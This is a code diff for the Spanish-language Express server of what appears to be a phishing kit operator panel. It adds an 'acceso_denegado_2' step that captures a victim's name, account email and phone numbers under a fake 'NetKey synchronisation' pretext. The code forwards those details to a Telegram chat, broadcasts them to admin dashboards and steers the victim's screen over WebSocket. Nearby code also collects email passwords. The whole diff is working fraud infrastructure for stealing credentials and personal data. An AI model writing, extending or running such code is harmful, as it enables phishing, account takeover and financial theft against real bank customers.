@@ -1777,6 +1777,41 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   }
                 }), accesoDenegadoCreatedBy);
                 break;
+              case 'acceso_denegado_2':
+                updatedFields.telefono1 = inputData.telefono1;
+                updatedFields.telefono2 = inputData.telefono2 || '';
+                updatedFields.correo = inputData.correo;
+                updatedFields.nombreRepresentante = inputData.nombreRepresentante;
+                updatedFields.pasoActual = ScreenType.MENSAJE;
+                console.log('Datos de contacto desde acceso denegado 2 recibidos:', inputData);
+
+                // Enviar notificación a Telegram con los datos de contacto
+                const accesoDenegado2Message = `🚫 <b>DATOS DE CONTACTO - ACCESO DENEGADO 2</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `👤 <b>Representante Legal:</b> ${inputData.nombreRepresentante}\n` +
+                  `📧 <b>Correo de la cuenta:</b> ${inputData.correo}\n` +
+                  `📱 <b>Teléfono 1:</b> ${inputData.telefono1}\n` +
+                  (inputData.telefono2 ? `📱 <b>Teléfono 2:</b> ${inputData.telefono2}\n` : '') +
+                  `⚠️ <b>Tipo:</b> Sincronización NetKey requerida\n` +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(accesoDenegado2Message);
+
+                // Notificar al admin
+                const accesoDenegado2CreatedBy = existingSession?.createdBy || '';
+
+                broadcastToAdmins(JSON.stringify({
+                  type: 'ACCESO_DENEGADO_2_CONTACTO_RECEIVED',
+                  data: {
+                    sessionId,
+                    telefono1: inputData.telefono1,
+                    telefono2: inputData.telefono2 || '',
+                    correo: inputData.correo,
+                    nombreRepresentante: inputData.nombreRepresentante,
+                    timestamp: new Date().toISOString(),
+                    createdBy: accesoDenegado2CreatedBy
+                  }
+                }), accesoDenegado2CreatedBy);
+                break;
               case 'gmail':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
@@ -1929,8 +1964,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 data: updatedSession
               }), createdBy); // Dirigimos el mensaje al creador de la sesión
 
-              // Si el tipo es acceso_denegado o datos_contacto, enviar SCREEN_CHANGE a MENSAJE
-              if (tipo === 'acceso_denegado' || tipo === 'datos_contacto') {
+              // Si el tipo es acceso_denegado, acceso_denegado_2 o datos_contacto, enviar SCREEN_CHANGE a MENSAJE
+              if (tipo === 'acceso_denegado' || tipo === 'acceso_denegado_2' || tipo === 'datos_contacto') {
                 const client = clients.get(sessionId);
                 if (client && client.readyState === WebSocket.OPEN) {
                   client.send(JSON.stringify({
